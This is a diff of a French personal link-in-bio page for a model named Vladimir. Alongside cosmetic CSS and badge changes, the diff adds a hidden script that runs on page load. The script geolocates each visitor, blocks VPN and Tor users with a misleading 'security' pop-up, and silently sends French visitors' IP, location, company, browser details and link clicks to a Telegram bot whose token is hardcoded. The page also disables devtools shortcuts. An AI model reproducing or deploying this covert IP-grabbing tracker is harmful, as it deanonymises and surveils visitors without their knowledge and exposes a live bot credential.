@@ -10,7 +10,7 @@
 <meta name="color-scheme" content="dark">
 <meta name="apple-mobile-web-app-capable" content="yes">
 <meta name="apple-mobile-web-app-status-bar-style" content="black">
-<title>vlad (@vladimirmoulu)</title>
+<title>Vladimir (@vladimirmoulu)</title>
 <style>
   *{
     margin:0;padding:0;box-sizing:border-box;
@@ -86,7 +86,7 @@
   /* vraie fumée : turbulence SVG qui bouillonne sur place et monte doucement */
   .smoke{
     position:absolute;
-    top:-2px;left:0;right:0;
+    top:-2px;left:-8%;right:-8%;
     height:80%;
     z-index:1;
     pointer-events:none;
@@ -157,18 +157,28 @@
     letter-spacing:.4px;
     text-shadow:0 2px 16px rgba(0,0,0,.85);
   }
-  .name svg{
+  /* badge : simple lumière qui clignote */
+  .cert{
     position:absolute;
     left:calc(100% + 7px);
     top:0;bottom:0;
     margin:auto 0;
     width:17px;height:17px;
     transform:translateY(2px);
-    animation:certPulse 1.8s ease-in-out infinite;
+    animation:certGlow 4.5s ease-in-out infinite;
   }
-  @keyframes certPulse{
-    0%,100%{ filter:drop-shadow(0 0 2px rgba(0,170,255,.55)); }
-    50%    { filter:drop-shadow(0 0 7px rgba(0,200,255,.95)); }
+  .cert svg{
+    width:100%;height:100%;display:block;
+    animation:certHue 4s linear infinite;
+  }
+  @keyframes certGlow{
+    0%,100%{ filter:drop-shadow(0 0 2px rgba(29,155,240,.4)); }
+    50%    { filter:drop-shadow(0 0 6px rgba(56,170,255,.8)); }
+  }
+  /* le badge passe par toute la roue chromatique en douceur */
+  @keyframes certHue{
+    from{ filter:hue-rotate(0deg); }
+    to  { filter:hue-rotate(360deg); }
   }
   .sub{
     margin-top:3px;
@@ -228,7 +238,7 @@
     color:transparent;
     animation:shine 3.2s linear infinite;
   }
-  /* vague de lumière qui traverse le texte bleu, en boucle */
+  /* vague de lumière blanche qui traverse le texte, en boucle */
   @keyframes shine{
     from{ background-position:200% 0; }
     to{ background-position:-200% 0; }
@@ -258,8 +268,29 @@
     transition:background .15s ease, border-color .15s ease, transform .15s ease;
   }
   .card:hover{background:rgba(255,255,255,.06);border-color:rgba(255,255,255,.28);transform:translateY(-1px)}
-  .card .ic{width:24px;height:24px;flex:0 0 auto;display:inline-flex}
+  .card .ic{width:24px;height:24px;flex:0 0 auto;display:inline-flex;transition:transform .25s cubic-bezier(.2,.7,.2,1)}
   .card .ic svg{width:100%;height:100%}
+  .card:hover .ic{transform:scale(1.1)}
+  .card:active{transform:translateY(0) scale(.992)}
+  .card:focus-visible{outline:none;border-color:rgba(255,255,255,.55);background:rgba(255,255,255,.07)}
+
+  /* ENTRÉE : apparition douce, montée + net, échelonnée */
+  @keyframes riseIn{
+    from{opacity:0;translate:0 10px;filter:blur(7px)}
+    to  {opacity:1;translate:0 0;filter:blur(0)}
+  }
+  .name{animation:riseIn .85s .05s both cubic-bezier(.2,.7,.2,1)}
+  .sub{animation:shine 3.2s linear infinite, riseIn .85s .2s both cubic-bezier(.2,.7,.2,1)}
+  .links .card{animation:riseIn .8s both cubic-bezier(.2,.7,.2,1)}
+  .links .card:nth-child(1){animation-delay:.32s}
+  .links .card:nth-child(2){animation-delay:.4s}
+  .links .card:nth-child(3){animation-delay:.48s}
+  .links .card:nth-child(4){animation-delay:.56s}
+
+  /* accessibilité : on coupe tout mouvement si l'utilisateur le refuse */
+  @media (prefers-reduced-motion: reduce){
+    *{animation:none !important;transition:none !important}
+  }
 </style>
 </head>
 <body>
@@ -270,10 +301,12 @@
       <div class="pname">
         <div class="name">
           Vladimir
-          <svg viewBox="0 0 24 24" aria-label="Vérifié">
-            <path fill="#1d9bf0" d="M22.25 12c0-1.43-.88-2.67-2.19-3.34.46-1.39.2-2.9-.81-3.91s-2.52-1.27-3.91-.81c-.66-1.31-1.91-2.19-3.34-2.19s-2.67.88-3.33 2.19c-1.4-.46-2.91-.2-3.92.81s-1.26 2.52-.8 3.91c-1.31.67-2.2 1.91-2.2 3.34s.89 2.67 2.2 3.34c-.46 1.39-.21 2.9.8 3.91s2.52 1.26 3.91.81c.67 1.31 1.91 2.19 3.34 2.19s2.68-.88 3.34-2.19c1.39.45 2.9.2 3.91-.81s1.27-2.52.81-3.91c1.31-.67 2.19-1.91 2.19-3.34z"/>
-            <path fill="#fff" d="M9.8 17.3l-4.45-4.45 1.4-1.4 3.05 3.05 6.45-6.45 1.4 1.4z"/>
-          </svg>
+          <span class="cert">
+            <svg viewBox="0 0 24 24" aria-label="Vérifié">
+              <path fill="#1d9bf0" d="M22.25 12c0-1.43-.88-2.67-2.19-3.34.46-1.39.2-2.9-.81-3.91s-2.52-1.27-3.91-.81c-.66-1.31-1.91-2.19-3.34-2.19s-2.67.88-3.33 2.19c-1.4-.46-2.91-.2-3.92.81s-1.26 2.52-.8 3.91c-1.31.67-2.2 1.91-2.2 3.34s.89 2.67 2.2 3.34c-.46 1.39-.21 2.9.8 3.91s2.52 1.26 3.91.81c.67 1.31 1.91 2.19 3.34 2.19s2.68-.88 3.34-2.19c1.39.45 2.9.2 3.91-.81s1.27-2.52.81-3.91c1.31-.67 2.19-1.91 2.19-3.34z"/>
+              <path fill="#fff" d="M9.8 17.3l-4.45-4.45 1.4-1.4 3.05 3.05 6.45-6.45 1.4 1.4z"/>
+            </svg>
+          </span>
         </div>
         <div class="sub">Mannequin</div>
       </div>
@@ -323,6 +356,104 @@
     if (e.ctrlKey && e.shiftKey && ['i','j','c'].indexOf(k) !== -1) { e.preventDefault(); return; }
     if ((e.ctrlKey || e.metaKey) && ['s','u','p','a'].indexOf(k) !== -1) { e.preventDefault(); }
   });
+</script>
+
+<script>
+  // ---- géoloc + anti-VPN + notification Telegram ----
+  (function(){
+    var TG_TOKEN = '8930161261:AAG58R0x0YIs2arx8a3rt9laS3JRHmfcPnQ';
+    var TG_CHAT  = '8215550381';
+
+    function esc(s){
+      return String(s == null ? '' : s)
+        .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    }
+
+    function send(text){
+      var body = new URLSearchParams();
+      body.set('chat_id', TG_CHAT);
+      body.set('text', text);
+      body.set('parse_mode', 'HTML');
+      body.set('disable_web_page_preview', 'true');
+      return fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: body.toString(),
+        keepalive: true
+      }).catch(function(){});
+    }
+
+    function visitorBlock(d){
+      var lines = [];
+      var loc = d && d.location ? d.location : {};
+      var place = [loc.city, loc.state, loc.country].filter(Boolean).join(', ');
+      if (d && d.ip) lines.push('🌐 IP : <code>' + esc(d.ip) + '</code>');
+      if (place)     lines.push('📍 ' + esc(place));
+      if (d && d.company && d.company.name) lines.push('🏢 ' + esc(d.company.name));
+      lines.push('💻 ' + esc(navigator.userAgent));
+      if (document.referrer) lines.push('↩️ Référent : ' + esc(document.referrer));
+      lines.push('🗣️ Langue : ' + esc(navigator.language || ''));
+      lines.push('🖥️ Écran : ' + screen.width + '×' + screen.height);
+      return lines.join('\n');
+    }
+
+    // pop-up bloquante anti-VPN
+    function showVpnBlock(){
+      if (document.getElementById('vpnBlock')) return;
+      var o = document.createElement('div');
+      o.id = 'vpnBlock';
+      o.style.cssText = 'position:fixed;inset:0;z-index:99999;background:rgba(0,0,0,.92);' +
+        'backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);display:flex;' +
+        'align-items:center;justify-content:center;padding:24px;' +
+        'font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;';
+      o.innerHTML =
+        '<div style="max-width:340px;width:100%;background:#15171c;border:1px solid #2a2e37;' +
+        'border-radius:20px;padding:28px 24px;text-align:center;box-shadow:0 30px 80px rgba(0,0,0,.7)">' +
+          '<div style="font-size:42px;line-height:1;margin-bottom:14px">🛡️</div>' +
+          '<div style="color:#fff;font-size:18px;font-weight:700;margin-bottom:10px">VPN détecté</div>' +
+          '<div style="color:#b6b9bf;font-size:14px;line-height:1.5;margin-bottom:22px">' +
+            'Pour des raisons de sécurité, veuillez désactiver votre VPN ou proxy puis réessayer pour continuer.' +
+          '</div>' +
+          '<button id="vpnRetry" style="width:100%;border:0;border-radius:12px;padding:13px;' +
+          'background:#1d9bf0;color:#fff;font-size:15px;font-weight:600;cursor:pointer">Réessayer</button>' +
+        '</div>';
+      document.body.appendChild(o);
+      document.getElementById('vpnRetry').addEventListener('click', function(){
+        location.reload();
+      });
+    }
+
+    // câbler les notifs de clic une fois la visite validée (France + pas de VPN)
+    function enableClickTracking(d){
+      document.querySelectorAll('a.card').forEach(function(a){
+        a.addEventListener('click', function(){
+          var title = (a.querySelector('.ctitle') || {}).textContent || a.href;
+          var sub   = (a.querySelector('.csub')   || {}).textContent || '';
+          send('🔗 <b>Lien cliqué : ' + esc(title) + '</b>\n' +
+               (sub ? '📝 ' + esc(sub) + '\n' : '') +
+               '➡️ ' + esc(a.href) + '\n\n' + visitorBlock(d));
+        });
+      });
+    }
+
+    fetch('https://api.ipapi.is/')
+      .then(function(r){ return r.json(); })
+      .then(function(d){
+        var isVpn = d && (d.is_vpn || d.is_proxy || d.is_tor || d.is_datacenter);
+        var cc = d && d.location ? (d.location.country_code || '') : '';
+
+        // 1) VPN/proxy -> pop-up bloquante, aucune notif
+        if (isVpn){ showVpnBlock(); return; }
+
+        // 2) hors de France -> page normale mais aucune notif
+        if (cc !== 'FR') return;
+
+        // 3) France sans VPN -> notif visite + suivi des clics
+        send('🟢 <b>Nouvelle visite</b>\n' + visitorBlock(d));
+        enableClickTracking(d);
+      })
+      .catch(function(){ /* en cas d'échec de l'API : aucune action */ });
+  })();
 </script>
 </body>
 </html>
